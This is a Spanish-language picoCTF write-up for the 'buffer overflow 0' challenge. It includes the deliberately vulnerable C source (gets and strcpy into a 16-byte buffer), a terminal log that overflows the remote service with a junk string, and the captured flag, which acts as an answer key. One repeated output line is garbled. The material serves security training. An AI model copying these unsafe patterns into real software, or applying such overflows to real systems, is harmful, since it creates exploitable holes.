# buffer overflow 0

## Descripción

Smash the stackLet's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/173/vuln). You can view source [here](https://artifacts.picoctf.net/c/173/vuln.c). And connect with it using:`nc saturn.picoctf.net 51532`

## Pistas

1.- How can you trigger the flag to print?

2.- If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.

3.- Run `man gets` and read the BUGS section. How many characters can the program really read?

## Solución

```
┌──(kali㉿kali)-[~/picoctf/binaryexplotation/bufferoverflow0]
└─$ wget https://artifacts.picoctf.net/c/172/vuln              
--2023-05-12 22:34:57--  https://artifacts.picoctf.net/c/172/vuln
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 18.154.132.32, 18.154.132.88, 18.154.132.74, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|18.154.132.32|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16016 (16K) [application/octet-stream]
Saving to: ‘vuln’

vuln                                     100%[===============================================================================>]  15.64K  --.-KB/s    in 0s      

2023-05-12 22:34:58 (92.9 MB/s) - ‘vuln’ saved [16016/16016]

                                                                                                                                                                 
┌──(kali㉿kali)-[~/picoctf/binaryexplotation/bufferoverflow0]
└─$ wget https://artifacts.picoctf.net/c/172/vuln.c
--2023-05-12 22:35:34--  https://artifacts.picoctf.net/c/172/vuln.c
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 18.154.132.88, 18.154.132.74, 18.154.132.108, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|18.154.132.88|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 808 [application/octet-stream]
Saving to: ‘vuln.c’

vuln.c                                   100%[===============================================================================>]     808  --.-KB/s    in 0s      

2023-05-12 22:35:35 (19.0 MB/s) - ‘vuln.c’ saved [808/808]

┌──(kali㉿kali)-[~/picoctf/binaryexplotation/bufferoverflow0]
└─$ ls -la
total 28
drwxr-xr-x 2 kali kali  4096 May 12 22:35 .
drwxr-xr-x 4 kali kali  4096 May 12 22:34 ..
-rw-r--r-- 1 kali kali 16016 Mar 15 23:16 vuln
-rw-r--r-- 1 kali kali   808 Mar 15 23:16 vuln.c
                                                                                                                                                                 
┌──(kali㉿kali)-[~/picoctf/binaryexplotation/bufferoverflow0]
└─$ chmod +x vuln 
                                                                                                                                                                 
┌──(kali㉿kali)-[~/picoctf/binaryexplotation/bufferoverflow0]
└─$ file vuln    
vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b53f59f147e1b0b087a736016a44d1db6dee530c, for GNU/Linux 3.2.0, not stripped
                                                                                                                                                                 
┌──(kali㉿kali)-[~/picoctf/binaryexplotation/bufferoverflow0]
└─$ ./vuln          
Please create 'flag.txt' in this directory with your own debugging flag.

┌──(kali㉿kali)-[~/picoctf/binaryexplotation/bufferoverflow0]
└─$ ls -la
total 28
drwxr-xr-x 2 kali kali  4096 May 12 22:35 .
drwxr-xr-x 4 kali kali  4096 May 12 22:34 ..
-rw-r--r-- 1 kali kali 16016 Mar 15 23:16 vuln
-rw-r--r-- 1 kali kali   808 Mar 15 23:16 vuln.c
                                                                               
┌──(kali㉿kali)-[~/picoctf/binaryexplotation/bufferoverflow0]
└─$ chmod +x vuln 
                                                                               
┌──(kali㉿kali)-[~/picoctf/binaryexplotation/bufferoverflow0]
└─$ file vuln    
vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically4d1db6dee530c, for GNU/Linux 3.2.0, not stripped
                                                                               
┌──(kali㉿kali)-[~/picoctf/binaryexplotation/bufferoverflow0]
└─$ ./vuln          
Please create 'flag.txt' in this directory with your own debugging flag.
                                                                               
┌──(kali㉿kali)-[~/picoctf/binaryexplotation/bufferoverflow0]
└─$ echo 'flag[dumieflag]' > flag.txt                                     
                                                                               
┌──(kali㉿kali)-[~/picoctf/binaryexplotation/bufferoverflow0]
└─$ ./vuln  
 

Input: 
The program will exit now

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}

┌──(kali㉿kali)-[~/picoctf/binaryexplotation/bufferoverflow0]
└─$ man gets

┌──(kali㉿kali)-[~/picoctf/binaryexplotation/bufferoverflow0]
└─$ nc saturn.picoctf.net 63397                                   
Input: oijasksjhdbsajhbwuuafcsnnuewufwewfwunuwhfnUWBFEWEF WIWIUGB WQYF BSFWWUU FUYWEGTWQDAuyfgsufbwenwbwd bd aiebwab wafb wf bgsf cuSGFH GWBTDVESWE BGFWEYDFQYWTE6735E4QWET736RTBWBGW6WETB WBCHGSV FNEUBYFWSHD GWBQXHWGEFTWESBUY AFVDHBXWTWH EXVWHSDGABXQHWD HFH WEFHDFWJHSDJADHWHAGd qJDFAD QH HGSVCJHGS  SGDCHSDGDCFS chgsfdtS HBAXGDSHGb ySDBGSB YYABESDFB UWSDBSBC^[W^[T^[ESTSHgHWSGF76QWGDBWEJSFBWEgfbweUBGWFFssdgvcsdfvbJAC
picoCTF{ov3rfl0ws_ar3nt_that_bad_8446a0c3}
```

## Bandera

picoCTF{ov3rfl0ws_ar3nt_that_bad_8446a0c3}

## Notas adicionales



## Referencias
- https://artifacts.picoctf.net/c/173/vuln
- https://artifacts.picoctf.net/c/173/vuln.c